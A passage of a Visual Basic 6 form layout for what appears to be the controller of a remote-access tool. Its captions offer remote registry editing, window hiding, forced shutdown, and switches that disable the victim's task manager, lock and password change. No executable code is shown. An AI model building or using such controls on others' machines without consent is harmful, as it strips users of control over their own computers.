         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   255
      Index           =   5
      Left            =   75
      TabIndex        =   4
      Top             =   2520
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   450
      AutoSize        =   0   'False
      BackColor       =   6957824
      Caption         =   "system"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   255
      Index           =   3
      Left            =   75
      TabIndex        =   3
      Top             =   1800
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   450
      AutoSize        =   0   'False
      BackColor       =   6957824
      Caption         =   "managers"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   270
      Index           =   2
      Left            =   75
      TabIndex        =   2
      Top             =   1440
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   476
      AutoSize        =   0   'False
      BackColor       =   6957824
      Caption         =   "interaction"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   255
      Index           =   1
      Left            =   75
      TabIndex        =   1
      Top             =   1080
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   450
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "server control"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   270
      Index           =   0
      Left            =   75
      TabIndex        =   0
      Top             =   720
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   476
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "connection"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   255
      Index           =   4
      Left            =   75
      TabIndex        =   45
      Top             =   2160
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   450
      AutoSize        =   0   'False
      BackColor       =   6957824
      Caption         =   "remote scripting"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16761024
      ShadowColor     =   9517312
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   2
      Left            =   3240
      TabIndex        =   69
      Top             =   2280
      Visible         =   0   'False
      Width           =   7185
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   375
         Index           =   17
         Left            =   480
         TabIndex        =   105
         Top             =   2040
         Width           =   2895
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   16
         Left            =   1200
         TabIndex        =   104
         Top             =   1320
         Width           =   2175
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   15
         Left            =   1440
         TabIndex        =   103
         Top             =   1560
         Width           =   1935
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   14
         Left            =   1440
         TabIndex        =   102
         Top             =   1800
         Width           =   1935
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   13
         Left            =   4800
         TabIndex        =   101
         Top             =   360
         Width           =   2415
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   12
         Left            =   1320
         TabIndex        =   100
         Top             =   1080
         Width           =   2055
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   11
         Left            =   4920
         TabIndex        =   99
         Top             =   2160
         Width           =   2295
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   10
         Left            =   5040
         TabIndex        =   98
         Top             =   1920
         Width           =   2175
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   9
         Left            =   4800
         TabIndex        =   97
         Top             =   1680
         Width           =   2415
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   8
         Left            =   4560
         TabIndex        =   96
         Top             =   1200
         Width           =   2655
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   7
         Left            =   4920
         TabIndex        =   95
         Top             =   960
         Width           =   2295
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   6
         Left            =   5160
         TabIndex        =   94
         Top             =   720
         Width           =   2055
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   5
         Left            =   4800
         TabIndex        =   93
         Top             =   1440
         Width           =   2415
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   4
         Left            =   1080
         TabIndex        =   92
         Top             =   840
         Width           =   2295
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   3
         Left            =   1440
         TabIndex        =   91
         Top             =   600
         Width           =   1935
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   2
         Left            =   1080
         TabIndex        =   90
         Top             =   360
         Width           =   2295
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   1
         Left            =   960
         TabIndex        =   89
         Top             =   120
         Width           =   2415
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Windows uptime :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   13
         Left            =   3480
         TabIndex        =   88
         Top             =   360
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Server version :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   12
         Left            =   120
         TabIndex        =   87
         Top             =   1080
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Winsock Index :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   11
         Left            =   120
         TabIndex        =   86
         Top             =   1560
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Screen resolution :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   10
         Left            =   3480
         TabIndex        =   85
         Top             =   2160
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Server start time :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   9
         Left            =   120
         TabIndex        =   84
         Top             =   1800
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Path:"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   8
         Left            =   120
         TabIndex        =   83
         Top             =   2040
         Width           =   375
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Online clients :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   120
         TabIndex        =   82
         Top             =   1320
         Width           =   1215
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Processor @ (Mhz) :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   3480
         TabIndex        =   81
         Top             =   1920
         Width           =   1575
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Processor name :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   5
         Left            =   3480
         TabIndex        =   80
         Top             =   1680
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Memory load :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   3480
         TabIndex        =   79
         Top             =   1200
         Width           =   1575
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Physical available :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   3
         Left            =   3480
         TabIndex        =   78
         Top             =   960
         Width           =   1575
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Product ID :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   77
         Top             =   840
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Processor class :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   3480
         TabIndex        =   76
         Top             =   1440
         Width           =   1335
      End
      Begin VB.Label Label20 
         BackColor       =   &H00000000&
         Caption         =   "Total physical memory :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3480
         TabIndex        =   75
         Top             =   720
         Width           =   1695
      End
      Begin VB.Label lblGetInfo 
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   255
         Index           =   0
         Left            =   4560
         TabIndex        =   74
         Top             =   120
         Width           =   2655
      End
      Begin VB.Label Label19 
         BackColor       =   &H00000000&
         Caption         =   "Remote time :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3480
         TabIndex        =   73
         Top             =   120
         Width           =   1335
      End
      Begin VB.Label Label18 
         BackColor       =   &H00000000&
         Caption         =   "PC name :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   72
         Top             =   120
         Width           =   1335
      End
      Begin VB.Label Label17 
         BackColor       =   &H00000000&
         Caption         =   "User name :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   71
         Top             =   360
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Windows version :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   70
         Top             =   600
         Width           =   1335
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   15
      Left            =   1560
      TabIndex        =   209
      Top             =   360
      Visible         =   0   'False
      Width           =   7185
      Begin VB.CheckBox Check11 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "disable change password"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   214
         Top             =   2040
         Width           =   2535
      End
      Begin VB.CheckBox Check10 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "disable lock"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   213
         Top             =   1560
         Width           =   2535
      End
      Begin VB.CheckBox Check9 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "disable shutdown"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   212
         Top             =   1080
         Width           =   2535
      End
      Begin VB.CheckBox Check8 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "disable logoff"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   211
         Top             =   600
         Width           =   2535
      End
      Begin VB.CheckBox Check7 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "disable taskmanager"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   210
         Top             =   120
         Width           =   2535
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   14
      Left            =   1200
      TabIndex        =   204
      Top             =   720
      Visible         =   0   'False
      Width           =   7185
      Begin VB.CheckBox Check6 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "forced exit ( do not wait for programs to end normally )"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1440
         TabIndex        =   206
         Top             =   240
         Width           =   4215
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   36
         Left            =   1560
         TabIndex        =   205
         Top             =   840
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "logoff user"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   38
         Left            =   1560
         TabIndex        =   207
         Top             =   1320
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "shutdown computer"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   77
         Left            =   1560
         TabIndex        =   208
         Top             =   1800
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "reboot computer"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   10
      Left            =   1320
      TabIndex        =   162
      Top             =   480
      Visible         =   0   'False
      Width           =   7185
      Begin MSComctlLib.ListView lstWind 
         Height          =   2145
         Left            =   240
         TabIndex        =   163
         Top             =   0
         Width           =   6735
         _ExtentX        =   11880
         _ExtentY        =   3784
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         ForeColor       =   16776960
         BackColor       =   4924675
         Appearance      =   0
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "hWnd"
            Object.Width           =   1411
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "PID"
            Object.Width           =   1058
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "window caption"
            Object.Width           =   8890
         EndProperty
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   28
         Left            =   240
         TabIndex        =   164
         Top             =   2160
         Width           =   1620
         _ExtentX        =   2858
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "refresh list"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   34
         Left            =   1920
         TabIndex        =   165
         Top             =   2160
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "activate"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   56
         Left            =   2760
         TabIndex        =   166
         Top             =   2160
         Width           =   795
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "flash"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   61
         Left            =   3600
         TabIndex        =   167
         Top             =   2160
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   62
         Left            =   4440
         TabIndex        =   168
         Top             =   2160
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   63
         Left            =   5280
         TabIndex        =   169
         Top             =   2160
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "minimize"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   64
         Left            =   6140
         TabIndex        =   170
         Top             =   2160
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "maximize"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   13
      Left            =   600
      TabIndex        =   191
      Top             =   2280
      Visible         =   0   'False
      Width           =   7185
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   78
         Left            =   6120
         TabIndex        =   194
         Top             =   0
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "delete key"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   79
         Left            =   4980
         TabIndex        =   195
         Top             =   0
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "delete value"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   83
         Left            =   3840
         TabIndex        =   199
         Top             =   0
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "set word val"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   35
         Left            =   2640
         TabIndex        =   192
         Top             =   0
         Width           =   1160
         _ExtentX        =   2037
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "set string val"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.ListBox lstRegKey 
         Appearance      =   0  'Flat
         BackColor       =   &H004B2503&
         ForeColor       =   &H00FFFF00&
         Height          =   1785
         Left            =   0
         TabIndex        =   202
         Top             =   360
         Width           =   2535
      End
      Begin VB.ListBox lstRegVal 
         Appearance      =   0  'Flat
         BackColor       =   &H004B2503&
         ForeColor       =   &H00FFFF00&
         Height          =   1590
         Left            =   2640
         TabIndex        =   201
         Top             =   560
         Width           =   4515
      End
      Begin VB.TextBox Text20 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   2640
         TabIndex        =   200
         Top             =   240
         Width           =   4520
      End
      Begin VB.TextBox Text21 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   1080
         TabIndex        =   196
         Top             =   2160
         Width           =   6080
      End
      Begin VB.ComboBox Combo3 
         Appearance      =   0  'Flat
         BackColor       =   &H00670120&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFF00&
         Height          =   300
         ItemData        =   "frmSqClient.frx":157A
         Left            =   0
         List            =   "frmSqClient.frx":1593
         Style           =   2  'Dropdown List
         TabIndex        =   193
         Top             =   0
         Width           =   2535
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   81
         Left            =   600
         TabIndex        =   197
         Top             =   2160
         Width           =   555
         _ExtentX        =   979
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "read :"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   82
         Left            =   0
         TabIndex        =   198
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   ".. up"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   16
      Left            =   1440
      TabIndex        =   215
      Top             =   960
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text23 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3840
         TabIndex        =   245
         Text            =   "about:blank"
